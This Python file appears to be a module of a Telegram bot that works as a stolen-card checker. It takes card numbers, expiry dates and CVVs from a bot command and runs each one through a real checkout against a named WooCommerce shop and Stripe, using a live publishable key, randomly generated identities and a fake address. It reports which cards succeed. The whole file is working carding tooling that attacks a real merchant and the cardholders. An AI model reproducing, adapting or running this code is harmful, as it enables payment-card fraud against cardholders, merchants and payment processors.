import requests
import random
import time

def generate_random_email():
    first = "".join(random.choices("abcdefghijklmnopqrstuvwxyz", k=4))
    last = "".join(random.choices("abcdefghijklmnopqrstuvwxyz", k=4))
    digits = "".join(random.choices("0123456789", k=6))
    return f"{first}{last}{digits}@gmail.com"

def generate_guid():
    import uuid
    return str(uuid.uuid4())

def get_str(source, start, end):
    try:
        return source.split(start)[1].split(end)[0]
    except IndexError:
        return ""

def check_nonsk3_card(card):
    cc, mon, year, cvv = card.split('|')
    session = requests.Session()

    # Step 1: Get random user info
    response = session.get("https://randomuser.me/api?nat=gb")
    user_info = response.json()
    first_name = user_info['results'][0]['name']['first']
    last_name = user_info['results'][0]['name']['last']
    email = generate_random_email()

    # Step 2: Add to cart
    add_to_cart_data = {
        "price": 5,
        "product_name": "Mini Heart",
        "product_sku": "",
        "product_id": 1690,
        "quantity": 1
    }
    session.post("https://yiliexpressions.com/?wc-ajax=add_to_cart", data=add_to_cart_data)

    # Step 3: Checkout
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"
    }
    response = session.get("https://yiliexpressions.com/checkout/", headers=headers)
    nonce = get_str(response.text, 'name="woocommerce-process-checkout-nonce" value="', '"')

    # Step 4: Create payment method
    payment_method_data = {
        "type": "card",
        "billing_details[name]": f"{first_name} {last_name}",
        "billing_details[address][line1]": "112 Street",
        "billing_details[address][state]": "NY",
        "billing_details[address][city]": "New York",
        "billing_details[address][postal_code]": "10010",
        "billing_details[address][country]": "US",
        "billing_details[email]": email,
        "billing_details[phone]": "5189410151",
        "card[number]": cc,
        "card[cvc]": cvv,
        "card[exp_month]": mon,
        "card[exp_year]": year,
        "guid": generate_guid(),
        "muid": generate_guid(),
        "sid": generate_guid(),
        "pasted_fields": "number",
        "payment_user_agent": "stripe.js%2F8f42a78e50%3B+stripe-js-v3%2F8f42a78e50%3B+split-card-element",
        "referrer": "https%3A%2F%2Fyiliexpressions.com",
        "time_on_page": "44000",
        "key": "pk_live_51HP442GWWn7aXlGRHviywylRO4zh9jGXW2Hi1NZ4jrFQz0e7f0TGargqoQWBbUo7uIDjPh3bMfq0y4fptS2K3oIH00UsKSbfoq"
    }
    response = session.post("https://api.stripe.com/v1/payment_methods", data=payment_method_data, headers=headers)
    payment_method_id = get_str(response.text, '"id": "', '"')

    # Step 5: Confirm order
    checkout_data = {
        "billing_first_name": first_name,
        "billing_last_name": last_name,
        "billing_company": "",
        "billing_country": "US",
        "billing_address_1": "112 Street",
        "billing_address_2": "",
        "billing_city": "New York",
        "billing_state": "NY",
        "billing_postcode": "10010",
        "billing_phone": "5189410151",
        "billing_email": email,
        "account_password": "",
        "ship_to_different_address": 1,
        "shipping_first_name": "James",
        "shipping_last_name": "DE",
        "shipping_company": "",
        "shipping_country": "US",
        "shipping_address_1": "112 Street",
        "shipping_address_2": "",
        "shipping_city": "New York",
        "shipping_state": "NY",
        "shipping_postcode": "10010",
        "order_comments": "",
        "wc_order_attribution_type": "typein",
        "wc_order_attribution_url": "(none)",
        "wc_order_attribution_utm_campaign": "(none)",
        "wc_order_attribution_utm_source": "(direct)",
        "wc_order_attribution_utm_medium": "(none)",
        "wc_order_attribution_utm_content": "(none)",
        "wc_order_attribution_utm_id": "(none)",
        "wc_order_attribution_utm_term": "(none)",
        "wc_order_attribution_session_entry": "https%3A%2F%2Fyiliexpressions.com%2F",
        "wc_order_attribution_session_start_time": "2024-01-30+20%3A58%3A36",
        "wc_order_attribution_session_pages": 10,
        "wc_order_attribution_session_count": 1,
        "wc_order_attribution_user_agent": "Mozilla%2F5.0+(Windows+NT+10.0%3B+Win64%3B+x64)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F121.0.0.0+Safari%2F537.36+Edg%2F121.0.0.0",
        "shipping_method[0]": "local_pickup%3A13",
        "payment_method": "stripe",
        "woocommerce-process-checkout-nonce": nonce,
        "stripe_source": payment_method_id,
        "_wp_http_referer": "/?wc-ajax=update_order_review"
    }
    response = session.post("https://yiliexpressions.com/?wc-ajax=checkout", data=checkout_data, headers=headers)
    response_text = response.text

    if "result\":\"success" in response_text:
        return "Payment successful✅"
    elif "result\":\"failure" in response_text:
        error_message = get_str(response_text, '\\\"alert\\\">\\n\\t\\t\\t<li>\\n\\t\\t\\t', '\\t\\t<\\/li>\\n\\t<\\/ul>')
        return f"Payment failed❌\nError: {error_message}"
    elif "3Dwc_stripe_verify_intent" in response_text:
        return "3D Secure authentication required🔒"
    else:
        return "Payment status unknown❓"

def process_nonsk3_command(bot, message):
    chat_id = message.chat.id
    cc_data = message.text.split()[1:]  # Get the CC data from the command
    if cc_data:
        total_cards = len(cc_data)
        start_time = time.time()
        results = []
        initial_message = "↯ NONSK CHECKER-3\n\n"
        msg = bot.send_message(chat_id, initial_message + get_footer_info(total_cards, start_time, message.from_user.username))

        for card in cc_data:
            result = check_nonsk3_card(card)
            results.append(f"Card: {card}\nResult => {result}")
            bot.edit_message_text(
                chat_id=chat_id,
                message_id=msg.message_id,
                text=initial_message + "\n\n".join(results) + "\n\n" + get_footer_info(total_cards, start_time, message.from_user.username)
            )

    else:
        bot.send_message(chat_id, "Please provide card details in the format: /nonsk3 cc|mon|year|cvv")

